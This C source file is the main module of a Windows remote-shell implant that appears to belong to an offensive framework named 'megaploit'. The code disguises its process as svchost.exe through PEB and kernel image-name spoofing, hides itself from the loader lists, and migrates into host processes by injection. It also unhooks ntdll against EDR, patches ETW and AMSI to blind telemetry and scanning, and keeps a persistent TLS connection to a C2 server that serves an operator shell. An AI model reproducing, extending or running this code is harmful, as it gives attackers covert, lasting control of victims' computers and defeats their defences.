/*
 * client/main.c  –  WinMain entry point for the remote shell client
 * ==================================================================
 * Responsibilities:
 *   1. Spoof PEB fields so Task Manager shows a benign process name/path.
 *   2. Enforce single-instance via a named mutex.
 *   3. Load NTDLL syscall pointers (ntcalls_load / ntcalls_verify).
 *   4. Initialise Winsock 2.2.
 *   5. Load the 32-byte HMAC shared secret from disk.
 *   6. Loop forever: TCP connect → TLS + HMAC + v2 handshake → shell loop.
 *      On any failure, clean up and retry after RECONNECT_DELAY_SEC.
 */

#include "config.h"
#include "spoof.h"
#include "ntcalls.h"
#include "inject.h"
#include "evasion.h"
#include "shell.h"
#include "../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

/* ── Absolute path to secret.key, resolved once at startup ─────────────── */
/* Stored here so the injected copy (running inside svchost.exe, whose CWD   */
/* is C:\Windows\System32) can still find the key next to the original EXE.  */
char g_key_path[MAX_PATH * 2] = {0};   /* extern'd by inject.c for RVA calc */
static DWORD WINAPI _agent_thread(LPVOID lpParam);  /* forward decl */

static void resolve_key_path(void)
{
    /* Start from the EXE's own full path */
    char exePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1);

    /* Strip the filename to get just the directory */
    char *last = strrchr(exePath, '\\');
    if (last) {
        *(last + 1) = '\0';                         /* keep trailing backslash */
        snprintf(g_key_path, sizeof(g_key_path),
                 "%s%s", exePath, SECRET_KEY_PATH); /* e.g. C:\...\secret.key */
    } else {
        /* No directory separator — just use the relative path as fallback */
        strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
    }
}


/* ── PEB process-name spoofing ──────────────────────────────────────────── */
/*
 * Task Manager reads process names from two sources:
 *   1. NtQuerySystemInformation(SystemProcessInformation) — reads
 *      SYSTEM_PROCESS_INFORMATION.ImageName, which the kernel populates
 *      from the PEB's ProcessParameters->ImagePathName at process creation.
 *      This is a snapshot taken at creation time and lives in kernel memory,
 *      so we CANNOT change what NtQuerySystemInformation returns after start.
 *
 *   2. The "Details" tab queries the process image path via
 *      QueryFullProcessImageName / NtQueryInformationProcess(ProcessImageFileName).
 *      This reads the kernel's EPROCESS.ImageFileName (15 chars, ASCII) and
 *      the file object path — also set at creation time, not patchable.
 *
 * However, Task Manager's "Processes" tab (the one in the screenshot) sources
 * its display name from the VERSION resource of the EXE file (FileDescription)
 * and from the window title of any visible window owned by the process.
 *
 * The most effective user-mode technique that works WITHOUT admin:
 *   • Overwrite ProcessParameters->ImagePathName and CommandLine in the PEB
 *     with a legitimate-looking path.  This fools tools that read these fields
 *     directly (Process Hacker, older Task Manager, Sysinternals).
 *   • Set the process description string in the PEB to match svchost.
 *
 * For the modern Windows 11 Task Manager (which shows the EXE file's
 * FileDescription resource and uses kernel image name), the only reliable
 * approach without a driver is process hollowing / migration — running inside
 * a legitimate host process.  We implement that as a compile-time option:
 * if DISGUISE_AS is defined, the agent migrates into that process on startup.
 *
 * What we always do (no-admin, pure user-mode):
 *   spoof_peb() — overwrites the UNICODE_STRING fields in ProcessParameters
 *   so any tool reading the PEB sees "C:\Windows\System32\svchost.exe -k netsvcs"
 */

/* ── Load the 32-byte HMAC key from disk ────────────────────────────────── */
/*                                                                            */
/*  secret.key must contain exactly 64 ASCII hex characters (lower or upper  */
/*  case, with or without a trailing newline).  This is the format written    */
/*  by megaploit.core.crypto when it calls:                                   */
/*      open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))       */
/*  The 64 hex chars decode to the 32 raw bytes used for HMAC-SHA256.        */

static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
{
    FILE *f = fopen(path, "rb");
    if (!f) return FALSE;

    /* Read 64 hex chars + optional whitespace + 1 safety byte */
    char hex[68] = {0};
    size_t n = fread(hex, 1, sizeof(hex) - 1, f);
    fclose(f);

    /* Strip trailing whitespace / newlines */
    while (n > 0 && (hex[n-1] == '\n' || hex[n-1] == '\r' ||
                      hex[n-1] == ' '  || hex[n-1] == '\t'))
        hex[--n] = '\0';

    if (n != 64) return FALSE;   /* must be exactly 64 hex digits */

    for (int i = 0; i < 32; i++) {
        char hi = hex[i * 2];
        char lo = hex[i * 2 + 1];
        BYTE h, l;

        if      (hi >= '0' && hi <= '9') h = (BYTE)(hi - '0');
        else if (hi >= 'a' && hi <= 'f') h = (BYTE)(hi - 'a' + 10);
        else if (hi >= 'A' && hi <= 'F') h = (BYTE)(hi - 'A' + 10);
        else return FALSE;

        if      (lo >= '0' && lo <= '9') l = (BYTE)(lo - '0');
        else if (lo >= 'a' && lo <= 'f') l = (BYTE)(lo - 'a' + 10);
        else if (lo >= 'A' && lo <= 'F') l = (BYTE)(lo - 'A' + 10);
        else return FALSE;

        key[i] = (BYTE)((h << 4) | l);
    }
    return TRUE;
}


/* ── WinMain ────────────────────────────────────────────────────────────── */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                     LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* ── 0. Resolve absolute key path before anything else ──────────────
     * Must happen first: GetModuleFileNameA(NULL) returns our EXE path   *
     * right now; after migration the same code in the injected copy will  *
     * see svchost.exe's path instead.  We capture the correct path here  *
     * so the injected agent inherits it via the loaded .exe image.       *
     * (g_key_path is a global in the .data section — it survives inside   *
     * the injected LoadLibrary copy unchanged.)                           */
    resolve_key_path();

    /* ── 0a. PEB user-mode fields → svchost.exe ─────────────────────── */
    spoof_peb();

    /* ── 0b. Kernel-side image file name → svchost.exe ──────────────── */
    spoof_kernel_image();

    /* ── 0c. Unlink EXE from PEB LDR lists ──────────────────────────── */
    unlink_self_from_ldr();

    /* ── 0d. Migrate to %TEMP%\RuntimeBroker.exe and exit launcher ───── */
    ntcalls_load();
    inject_init();              /* calls sc_init() — resolves SSNs via PEB   */
    auto_migrate(g_key_path);   /* exits on success; falls through on failure */

    /* ── 1. Single-instance guard ─────────────────────────────────────── */
    CreateMutexA(NULL, FALSE, "consoleShell");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* ── 1a. Evasion: unhook ntdll, patch ETW + AMSI ─────────────────── */
    /* inject_init() / sc_init() ran first above — SSNs are resolved.     *
     * unhook_ntdll uses SC_NtWriteVirtualMemory (no RWX page).           *
     * etw_patch / amsi_patch likewise use SC_NtWriteVirtualMemory.       *
     * ETW: stops Windows event telemetry from this process.               *
     * AMSI: prevents in-process content scanning.                         *
     * unhook: remaps ntdll .text from disk, removing EDR inline hooks.    */
    unhook_ntdll();   /* must be first — restores clean syscall stubs      */
    etw_patch();      /* patch EtwEventWrite → RET                         */
    amsi_patch();     /* patch AmsiScanBuffer → S_OK                       */

    /* ── 2. NT syscall pointers ──────────────────────────────────────── */
    /* BUG 3: return value was unchecked                                  */
    if (!ntcalls_load()) return 0x02;
    ntcalls_verify();  /* non-fatal; only forceOff/blueScreen need it    */

    /* ── 3. Winsock 2.2 ──────────────────────────────────────────────── */
    /* No AllocConsole/ShowWindow needed — the binary is built with      */
    /* /SUBSYSTEM:WINDOWS (-mwindows) so the OS never allocates a        */
    /* console window.  AllocConsole + ShowWindow(SW_HIDE) was noisy     */
    /* and easily flagged by behavioural AV heuristics.                  */
    /* (was MAKEWORD(2,0) — fixed to MAKEWORD(2,2))                      */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0x03;

    /* ── 5. Load shared secret ───────────────────────────────────────── */
    BYTE secretKey[SECRET_KEY_LEN];
    if (!load_secret_key(g_key_path, secretKey)) {
        WSACleanup();
        return 0x01;
    }

    /* ── 6. Reconnect loop ───────────────────────────────────────────── */
    while (1) {

        /* BUG 6: a new socket must be created on every outer iteration.
         * The old code created the socket once outside the inner retry
         * loop, so a failed connect() that consumed the socket (e.g.
         * WSAETIMEDOUT on some stacks) would leak it.                   */
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(C2_PORT);

        /* BUG 5: inet_addr() is deprecated, rejects IPv6, and returns
         * INADDR_NONE for "255.255.255.255" without any error indicator.
         * InetPtonA handles both IPv4 and IPv6 correctly.               */
        if (InetPtonA(AF_INET, C2_IP, &addr.sin_addr) != 1) {
            /* C2_IP is a compile-time constant; if it fails here the
             * build itself is misconfigured — exit rather than loop.   */
            closesocket(sock);
            WSACleanup();
            return 0x04;
        }

        /* Retry TCP connect; recreate socket on each failure to avoid
         * using a socket that may have been put into an error state.   */
        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            /* BUG 6 fix: close and recreate the socket before retrying */
            closesocket(sock);
            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock == INVALID_SOCKET) {
                /* Keep retrying; socket() will succeed once resources free */
                obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
                /* Re-enter the while(connect) with INVALID_SOCKET —
                 * connect() will fail immediately, loop will retry.    */
            }
        }

        if (sock == INVALID_SOCKET) {
            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        /* TLS handshake + HMAC auth + protocol v2 negotiation */
        TLS_CONTEXT tls;
        ZeroMemory(&tls, sizeof(tls));
        if (!tls_connect(&tls, sock, C2_IP, secretKey)) {
            closesocket(sock);
            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        /* BUG 7: wipe the key immediately after seeding the TLS context
         * so it does not linger in the stack frame for the rest of the
         * session duration.  tls_connect() copies it into sessionKey.  */
        SecureZeroMemory(secretKey, sizeof(secretKey));

        /* Shell command loop — blocks until the C2 disconnects or
         * sends "exit" / "q".  shell_run() calls tls_disconnect()
         * and WSACleanup() internally on a clean exit verb.           */
        shell_run(&tls);

        /* Defensive cleanup for the case where shell_run() returns
         * due to a recv() failure (connection dropped) rather than a
         * clean "exit" command — tls_disconnect is idempotent.       */
        tls_disconnect(&tls);
        closesocket(sock);

        /* Reload the secret key for the next connection attempt */
        if (!load_secret_key(g_key_path, secretKey)) {
            /* Key file was deleted or corrupted while we were running;
             * give up rather than connect with a garbage key.         */
            WSACleanup();
            return 0x01;
        }

        obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
    }

    /* Unreachable; WSACleanup / SecureZeroMemory called above */
}

/* ── AgentRun — exported entry point called by the bootstrap after migration ─
 *
 * When auto_migrate() injects this EXE into explorer.exe via LoadLibraryA +
 * GetProcAddress, the bootstrap calls AgentRun() directly.
 * LoadLibraryA on a GUI-subsystem .exe does NOT call DllMain automatically —
 * we must export an explicit entry point and call it from the bootstrap.
 *
 * AgentRun() resolves the key path from the loaded module's own file location,
 * then spins up the C2 connect loop on a background thread so it returns fast.
 */

__declspec(dllexport) void AgentRun(void)
{
    /* Resolve key path from our own module location */
    HMODULE hSelf = NULL;
    GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCSTR)&AgentRun, &hSelf);

    char modPath[MAX_PATH] = {0};
    if (hSelf)
        GetModuleFileNameA(hSelf, modPath, sizeof(modPath) - 1);

    char *last = strrchr(modPath, '\\');
    if (last) {
        *(last + 1) = '\0';
        snprintf(g_key_path, sizeof(g_key_path), "%s%s", modPath, SECRET_KEY_PATH);
    } else if (modPath[0]) {
        strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
    }
    /* else g_key_path was already set by WinMain's resolve_key_path() */

    HANDLE hThread = CreateThread(NULL, 0, _agent_thread, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
}


/* ── DllMain — fallback entry point if OS calls it ──────────────────────── */
/*
 * On modern Windows, LoadLibraryA on a GUI EXE does NOT call DllMain.
 * This stub is kept as a safety net only.
 */

static DWORD WINAPI _agent_thread(LPVOID lpParam)
{
    (void)lpParam;

    /* Initialise NT syscalls + Winsock */
    ntcalls_load();
    inject_init();

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    BYTE secretKey[SECRET_KEY_LEN];
    if (!load_secret_key(g_key_path, secretKey)) { WSACleanup(); return 1; }

    while (1) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) { obfuscate_sleep(RECONNECT_DELAY_SEC * 1000); continue; }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(C2_PORT);

        if (InetPtonA(AF_INET, C2_IP, &addr.sin_addr) != 1) {
            closesocket(sock); WSACleanup(); return 4;
        }

        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            closesocket(sock);
            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock == INVALID_SOCKET)
                obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
        }
        if (sock == INVALID_SOCKET) { obfuscate_sleep(RECONNECT_DELAY_SEC * 1000); continue; }

        TLS_CONTEXT tls;
        ZeroMemory(&tls, sizeof(tls));
        if (!tls_connect(&tls, sock, C2_IP, secretKey)) {
            closesocket(sock);
            obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        SecureZeroMemory(secretKey, sizeof(secretKey));
        shell_run(&tls);
        tls_disconnect(&tls);
        closesocket(sock);

        if (!load_secret_key(g_key_path, secretKey)) { WSACleanup(); return 1; }
        obfuscate_sleep(RECONNECT_DELAY_SEC * 1000);
    }
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
{
    (void)lpReserved;
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        /* Resolve absolute path to secret.key from our own module's location.
         * GetModuleFileNameA(hModule) returns the path of our loaded .exe file
         * even when it is loaded as a DLL inside a foreign process.           */
        char modPath[MAX_PATH] = {0};
        GetModuleFileNameA(hModule, modPath, sizeof(modPath) - 1);
        char *last = strrchr(modPath, '\\');
        if (last) {
            *(last + 1) = '\0';
            snprintf(g_key_path, sizeof(g_key_path), "%s%s", modPath, SECRET_KEY_PATH);
        } else {
            strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
        }

#ifdef DEBUG_DLLMAIN_MSGBOX
        /* Debug probe: write key path + load result to a temp file */
        {
            FILE *dbg = fopen("C:\\Windows\\Temp\\agent_debug.txt", "w");
            if (dbg) {
                fprintf(dbg, "DllMain fired. modPath='%s'\n", modPath);
                fprintf(dbg, "g_key_path='%s'\n", g_key_path);
                BYTE testKey[32];
                BOOL keyOk = load_secret_key(g_key_path, testKey);
                fprintf(dbg, "load_secret_key=%d\n", keyOk);
                fclose(dbg);
            }
        }
#endif

        /* Spin up C2 loop on a background thread — DllMain must return fast */
        HANDLE hThread = CreateThread(NULL, 0, _agent_thread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
